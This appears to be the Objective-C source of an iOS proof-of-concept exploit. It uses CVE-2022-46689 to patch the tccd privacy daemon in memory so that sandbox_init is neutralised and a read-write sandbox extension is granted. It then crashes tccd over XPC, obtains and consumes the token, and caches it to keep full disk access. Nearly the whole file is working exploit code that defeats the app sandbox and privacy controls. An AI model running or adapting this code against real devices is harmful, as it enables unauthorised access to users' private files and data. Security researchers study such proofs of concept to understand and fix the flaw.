@import Darwin;
@import Foundation;
@import MachO;

#import <mach-o/fixup-chains.h>
// you'll need helpers.m from Ian Beer's write_no_write and vm_unaligned_copy_switch_race.m from
// WDBFontOverwrite
// Also, set an NSAppleMusicUsageDescription in Info.plist (can be anything)
// Please don't call this code on iOS 14 or below
// (This temporarily overwrites tccd, and on iOS 14 and above changes do not revert on reboot)
#import "helpers.h"
#import "vm_unaligned_copy_switch_race.h"

typedef NSObject* xpc_object_t;
typedef xpc_object_t xpc_connection_t;
typedef void (^xpc_handler_t)(xpc_object_t object);
xpc_object_t xpc_dictionary_create(const char* const _Nonnull* keys,
                                   xpc_object_t _Nullable const* values, size_t count);
xpc_connection_t xpc_connection_create_mach_service(const char* name, dispatch_queue_t targetq,
                                                    uint64_t flags);
void xpc_connection_set_event_handler(xpc_connection_t connection, xpc_handler_t handler);
void xpc_connection_resume(xpc_connection_t connection);
void xpc_connection_send_message_with_reply(xpc_connection_t connection, xpc_object_t message,
                                            dispatch_queue_t replyq, xpc_handler_t handler);
xpc_object_t xpc_connection_send_message_with_reply_sync(xpc_connection_t connection,
                                                         xpc_object_t message);
xpc_object_t xpc_bool_create(bool value);
xpc_object_t xpc_string_create(const char* string);
xpc_object_t xpc_null_create(void);
const char* xpc_dictionary_get_string(xpc_object_t xdict, const char* key);

int64_t sandbox_extension_consume(const char* token);

// MARK: - patchfind

struct grant_full_disk_access_offsets {
  uint64_t offset_addr_s_com_apple_tcc_;
  uint64_t offset_padding_space_for_read_write_string;
  uint64_t offset_addr_s_kTCCServiceMediaLibrary;
  uint64_t offset_auth_got__sandbox_init;
  uint64_t offset_just_return_0;
  bool is_arm64e;
};

static bool patchfind_sections(void* executable_map,
                               struct segment_command_64** data_const_segment_out,
                               struct symtab_command** symtab_out,
                               struct dysymtab_command** dysymtab_out) {
  struct mach_header_64* executable_header = executable_map;
  struct load_command* load_command = executable_map + sizeof(struct mach_header_64);
  for (int load_command_index = 0; load_command_index < executable_header->ncmds;
       load_command_index++) {
    switch (load_command->cmd) {
      case LC_SEGMENT_64: {
        struct segment_command_64* segment = (struct segment_command_64*)load_command;
        if (strcmp(segment->segname, "__DATA_CONST") == 0) {
          *data_const_segment_out = segment;
        }
        break;
      }
      case LC_SYMTAB: {
        *symtab_out = (struct symtab_command*)load_command;
        break;
      }
      case LC_DYSYMTAB: {
        *dysymtab_out = (struct dysymtab_command*)load_command;
        break;
      }
    }
    load_command = ((void*)load_command) + load_command->cmdsize;
  }
  return true;
}

static uint64_t patchfind_get_padding(struct segment_command_64* segment) {
  struct section_64* section_array = ((void*)segment) + sizeof(struct segment_command_64);
  struct section_64* last_section = &section_array[segment->nsects - 1];
  return last_section->offset + last_section->size;
}

static uint64_t patchfind_pointer_to_string(void* executable_map, size_t executable_length,
                                            const char* needle) {
  void* str_offset = memmem(executable_map, executable_length, needle, strlen(needle) + 1);
  if (!str_offset) {
    return 0;
  }
  uint64_t str_file_offset = str_offset - executable_map;
  for (int i = 0; i < executable_length; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + i);
    if ((val & 0xfffffffful) == str_file_offset) {
      return i;
    }
  }
  return 0;
}

static uint64_t patchfind_return_0(void* executable_map, size_t executable_length) {
  // TCCDSyncAccessAction::sequencer
  // mov x0, #0
  // ret
  static const char needle[] = {0x00, 0x00, 0x80, 0xd2, 0xc0, 0x03, 0x5f, 0xd6};
  void* offset = memmem(executable_map, executable_length, needle, sizeof(needle));
  if (!offset) {
    return 0;
  }
  return offset - executable_map;
}

static uint64_t patchfind_got(void* executable_map, size_t executable_length,
                              struct segment_command_64* data_const_segment,
                              struct symtab_command* symtab_command,
                              struct dysymtab_command* dysymtab_command,
                              const char* target_symbol_name) {
  uint64_t target_symbol_index = 0;
  for (int sym_index = 0; sym_index < symtab_command->nsyms; sym_index++) {
    struct nlist_64* sym =
        ((struct nlist_64*)(executable_map + symtab_command->symoff)) + sym_index;
    const char* sym_name = executable_map + symtab_command->stroff + sym->n_un.n_strx;
    if (strcmp(sym_name, target_symbol_name)) {
      continue;
    }
    // printf("%d %llx\n", sym_index, (uint64_t)(((void*)sym) - executable_map));
    target_symbol_index = sym_index;
    break;
  }

  struct section_64* section_array =
      ((void*)data_const_segment) + sizeof(struct segment_command_64);
  struct section_64* first_section = &section_array[0];
  if (strcmp(first_section->sectname, "__auth_got")) {
    // TODO(zhuowei): arm64?
    return 0;
  }
  uint32_t* indirect_table = executable_map + dysymtab_command->indirectsymoff;

  for (int i = 0; i < first_section->size; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + first_section->offset + i);
    uint64_t indirect_table_entry = (val & 0xfffful);
    if (indirect_table[first_section->reserved1 + indirect_table_entry] == target_symbol_index) {
      return first_section->offset + i;
    }
  }
  return 0;
}

static bool patchfind(void* executable_map, size_t executable_length,
                      struct grant_full_disk_access_offsets* offsets) {
  struct segment_command_64* data_const_segment = nil;
  struct symtab_command* symtab_command = nil;
  struct dysymtab_command* dysymtab_command = nil;
  if (!patchfind_sections(executable_map, &data_const_segment, &symtab_command,
                          &dysymtab_command)) {
    printf("no sections\n");
    return false;
  }
  if ((offsets->offset_addr_s_com_apple_tcc_ =
           patchfind_pointer_to_string(executable_map, executable_length, "com.apple.tcc.")) == 0) {
    printf("no com.apple.tcc. string\n");
    return false;
  }
  if ((offsets->offset_padding_space_for_read_write_string =
           patchfind_get_padding(data_const_segment)) == 0) {
    printf("no padding\n");
    return false;
  }
  if ((offsets->offset_addr_s_kTCCServiceMediaLibrary = patchfind_pointer_to_string(
           executable_map, executable_length, "kTCCServiceMediaLibrary")) == 0) {
    printf("no kTCCServiceMediaLibrary string\n");
    return false;
  }
  if ((offsets->offset_auth_got__sandbox_init =
           patchfind_got(executable_map, executable_length, data_const_segment, symtab_command,
                         dysymtab_command, "_sandbox_init")) == 0) {
    printf("no sandbox_init\n");
    return false;
  }
  if ((offsets->offset_just_return_0 = patchfind_return_0(executable_map, executable_length)) ==
      0) {
    printf("no just return 0\n");
    return false;
  }
  struct mach_header_64* executable_header = executable_map;
  offsets->is_arm64e = (executable_header->cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;

  return true;
}

// MARK: - tccd patching

static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
  // reimplmentation of TCCAccessRequest, as we need to grab and cache the sandbox token so we can
  // re-use it until next reboot returns the sandbox token if there is one, or nil if there isn't
  // one.
  xpc_connection_t connection = xpc_connection_create_mach_service(
      "com.apple.tccd", dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), 0);
  xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {
    NSLog(@"xpc event handler: %@", object);
  });
  xpc_connection_resume(connection);
  const char* keys[] = {
      "TCCD_MSG_ID",  "function",           "service", "require_purpose", "preflight",
      "target_token", "background_session",
  };
  xpc_object_t values[] = {
      xpc_string_create("17087.1"),
      xpc_string_create("TCCAccessRequest"),
      xpc_string_create("com.apple.app-sandbox.read-write"),
      xpc_null_create(),
      xpc_bool_create(false),
      xpc_null_create(),
      xpc_bool_create(false),
  };
  xpc_object_t request_message = xpc_dictionary_create(keys, values, sizeof(keys) / sizeof(*keys));
#if 0
  xpc_object_t response_message = xpc_connection_send_message_with_reply_sync(connection, request_message);
  NSLog(@"%@", response_message);

#endif
  xpc_connection_send_message_with_reply(
      connection, request_message, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0),
      ^(xpc_object_t object) {
        if (!object) {
          NSLog(@"object is nil???");
          completion(nil);
          return;
        }
        NSLog(@"response: %@", object);
        if ([object isKindOfClass:NSClassFromString(@"OS_xpc_error")]) {
          NSLog(@"xpc error?");
          completion(nil);
          return;
        }
        NSLog(@"debug description: %@", [object debugDescription]);
        const char* extension_string = xpc_dictionary_get_string(object, "extension");
        NSString* extension_nsstring =
            extension_string ? [NSString stringWithUTF8String:extension_string] : nil;
        completion(extension_nsstring);
      });
}

static NSData* patchTCCD(void* executableMap, size_t executableLength) {
  struct grant_full_disk_access_offsets offsets = {};
  if (!patchfind(executableMap, executableLength, &offsets)) {
    return nil;
  }

  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
  // strcpy(data.mutableBytes, "com.apple.app-sandbox.read-write", sizeOfStr);
  char* mutableBytes = data.mutableBytes;
  {
    // rewrite com.apple.tcc. into blank string
    *(uint64_t*)(mutableBytes + offsets.offset_addr_s_com_apple_tcc_ + 8) = 0;
  }
  {
    // make offset_addr_s_kTCCServiceMediaLibrary point to "com.apple.app-sandbox.read-write"
    // we need to stick this somewhere; just put it in the padding between
    // the end of __objc_arrayobj and the end of __DATA_CONST
    strcpy((char*)(data.mutableBytes + offsets.offset_padding_space_for_read_write_string),
           "com.apple.app-sandbox.read-write");
    struct dyld_chained_ptr_arm64e_rebase targetRebase =
        *(struct dyld_chained_ptr_arm64e_rebase*)(mutableBytes +
                                                  offsets.offset_addr_s_kTCCServiceMediaLibrary);
    targetRebase.target = offsets.offset_padding_space_for_read_write_string;
    *(struct dyld_chained_ptr_arm64e_rebase*)(mutableBytes +
                                              offsets.offset_addr_s_kTCCServiceMediaLibrary) =
        targetRebase;
    *(uint64_t*)(mutableBytes + offsets.offset_addr_s_kTCCServiceMediaLibrary + 8) =
        strlen("com.apple.app-sandbox.read-write");
  }
  {
    // make sandbox_init call return 0;
    struct dyld_chained_ptr_arm64e_auth_rebase targetRebase = {
        .auth = 1,
        .bind = 0,
        .next = 1,
        .key = 0,  // IA
        .addrDiv = 1,
        .diversity = 0,
        .target = offsets.offset_just_return_0,
    };
    *(struct dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                                   offsets.offset_auth_got__sandbox_init) =
        targetRebase;
  }
  return data;
}

static bool overwrite_file(int fd, NSData* sourceData) {
  for (int off = 0; off < sourceData.length; off += 0x4000) {
    bool success = false;
    for (int i = 0; i < 2; i++) {
      if (unaligned_copy_switch_race(
              fd, off, sourceData.bytes + off,
              off + 0x4000 > sourceData.length ? sourceData.length - off : 0x4000)) {
        success = true;
        break;
      }
    }
    if (!success) {
      return false;
    }
  }
  return true;
}

static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
                                                           NSError* _Nullable error)) {
  char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  if (fd == -1) {
    targetPath = "/System/Library/PrivateFrameworks/TCC.framework/tccd";
    fd = open(targetPath, O_RDONLY | O_CLOEXEC);
    if (fd == -1) {
        completion(nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                            code:5
                                        userInfo:@{NSLocalizedDescriptionKey : @"Can't patchfind."}]);
        return;
    }
  }
  off_t targetLength = lseek(fd, 0, SEEK_END);
  lseek(fd, 0, SEEK_SET);
  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);

  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
  NSData* sourceData = patchTCCD(targetMap, targetLength);
  if (!sourceData) {
    completion(nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                        code:5
                                    userInfo:@{NSLocalizedDescriptionKey : @"Can't patchfind."}]);
    return;
  }

  if (!overwrite_file(fd, sourceData)) {
    overwrite_file(fd, originalData);
    munmap(targetMap, targetLength);
    completion(
        nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                 code:1
                             userInfo:@{
                               NSLocalizedDescriptionKey : @"Can't overwrite file: your device may "
                                                           @"not be vulnerable to CVE-2022-46689."
                             }]);
    return;
  }
  munmap(targetMap, targetLength);

  xpc_crasher("com.apple.tccd");
  sleep(1);
  call_tccd(^(NSString* _Nullable extension_token) {
    overwrite_file(fd, originalData);
    xpc_crasher("com.apple.tccd");
    NSError* returnError = nil;
    if (extension_token == nil) {
      returnError =
          [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                              code:2
                          userInfo:@{
                            NSLocalizedDescriptionKey : @"tccd did not return an extension token."
                          }];
    } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
      returnError = [NSError
          errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                     code:3
                 userInfo:@{
                   NSLocalizedDescriptionKey : @"tccd patch failed: returned a media library token "
                                               @"instead of an app sandbox token."
                 }];
      extension_token = nil;
    }
    completion(extension_token, returnError);
  });
}

void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
  NSURL* documentDirectory = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory
                                                                  inDomains:NSUserDomainMask][0];
  NSURL* sourceURL =
      [documentDirectory URLByAppendingPathComponent:@"full_disk_access_sandbox_token.txt"];
  NSError* error = nil;
  NSString* cachedToken = [NSString stringWithContentsOfURL:sourceURL
                                                   encoding:NSUTF8StringEncoding
                                                      error:&error];
  if (cachedToken) {
    int64_t handle = sandbox_extension_consume(cachedToken.UTF8String);
    if (handle > 0) {
      // cached version worked
      completion(nil);
      return;
    }
  }
  grant_full_disk_access_impl(^(NSString* extension_token, NSError* _Nullable error) {
    if (error) {
      completion(error);
      return;
    }
    int64_t handle = sandbox_extension_consume(extension_token.UTF8String);
    if (handle <= 0) {
      completion([NSError
          errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                     code:4
                 userInfo:@{NSLocalizedDescriptionKey : @"Failed to consume generated extension"}]);
      return;
    }
    [extension_token writeToURL:sourceURL
                     atomically:true
                       encoding:NSUTF8StringEncoding
                          error:&error];
    completion(nil);
  });
}
